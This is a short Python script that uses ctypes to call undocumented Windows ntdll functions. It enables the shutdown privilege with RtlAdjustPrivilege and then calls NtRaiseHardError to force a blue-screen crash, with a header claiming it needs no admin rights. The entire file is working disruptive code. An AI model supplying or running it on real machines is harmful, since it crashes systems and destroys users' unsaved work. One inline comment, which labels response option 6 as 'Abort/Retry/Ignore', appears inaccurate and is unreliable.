# This code should raise a bluescreen on Windows.
# Generally, it will not require any admin permissions.
from ctypes import windll          # Import Windows DLLs interface module from ctypes
from ctypes import c_int           # Import C integer type
from ctypes import c_uint          # Import C unsigned integer type
from ctypes import c_ulong         # Import C unsigned long type
from ctypes import POINTER         # Import POINTER type constructor from ctypes
from ctypes import byref           # Import by reference passing helper from ctypes

nullptr = POINTER(c_int)()         # Create a null pointer of type POINTER to c_int

windll.ntdll.RtlAdjustPrivilege(
    c_uint(19),                    # The privilege to adjust to   : "SeShutdownPrivilege" = 19
    c_uint(1),                     # Boolean status of privilege : Enabled = 1
    c_uint(0),                     # Whether to adjust the privilege for the calling thread's access token: Process = 0, Thread = 1
    byref(c_int())                 # Placeholder for the previous state (not used here)
)

windll.ntdll.NtRaiseHardError(
    c_ulong(0xC000007B),           # The error code to raise (0xC000007B is an NTSTATUS code)
    c_ulong(0),                    # The number of parameters that follow (0 in this case)
    nullptr,                       # Optional pointer to an array of ULONG_PTRs that contains the parameters
    nullptr,                       # Optional pointer to the string if the error includes a string parameter
    c_uint(6),                     # The response option used in the message box (6 for 'Abort/Retry/Ignore')
    byref(c_uint())                # Placeholder where the function will return which option was selected
)
